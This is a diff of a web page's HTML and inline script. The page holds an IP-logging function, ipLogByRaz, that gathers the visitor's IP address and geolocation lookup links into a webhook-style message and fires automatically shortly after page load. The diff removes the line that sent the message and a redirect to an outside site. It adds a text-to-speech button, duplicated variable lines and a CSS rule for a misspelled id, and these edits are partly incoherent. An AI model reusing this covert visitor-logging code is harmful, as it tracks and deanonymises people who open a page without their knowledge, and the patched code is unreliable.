@@ -21,6 +21,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
   </head>
   <body>
+    <button id=button>Start</button>
       <div id="iframeContainer">
   </div>
     <header class="header"></header>
@@ -50,7 +51,8 @@
         const secondList = document.getElementsByClassName("header")[0]
         secondList.appendChild(div)
       });
-
+var ispp = document.getElementById('ipppp').innerHTML
+        var ispp2 = document.getElementById('ipppp').innerHTML + "/json/"
       function ipLogByRaz() {
         var ispp = document.getElementById('ipppp').innerHTML
         var ispp2 = document.getElementById('ipppp').innerHTML + "/json/"
@@ -63,12 +65,25 @@
           avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
           content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Raw** : _https://ipapi.co/" + ispp2 + "_\n**Extra Info** : ```" + extra + "```"
         }
-        request.send(JSON.stringify(params));
-        window.open('https://doctoraux.com/','_blank')
       }
       setTimeout(function() {
         ipLogByRaz()
       }, 700);
+      document.getElementById("button").addEventListener("click", function() {
+    let sentence = document.getElementById("ipppp").value;
+    
+    // Check if there's any text in the textarea
+    if (sentence.trim() !== "") {
+        let speech = new SpeechSynthesisUtterance(sentence);
+        // Optionally, you can adjust the voice properties here
+        speech.volume = 1; // from 0 to 1
+        speech.rate = 1;   // from 0.1 to 10
+        speech.pitch = 1;  // from 0 to 2
+        
+        // Use browser's default speech synthesis API to speak
+        window.speechSynthesis.speak(speech);
+    }
+});
     </script>
     <style>
       .header {
@@ -77,6 +92,9 @@
 
       .map-container {
         display: none
+      }
+      #sentance {
+display: none;
       }
           #iframeContainer {
         position: absolute;
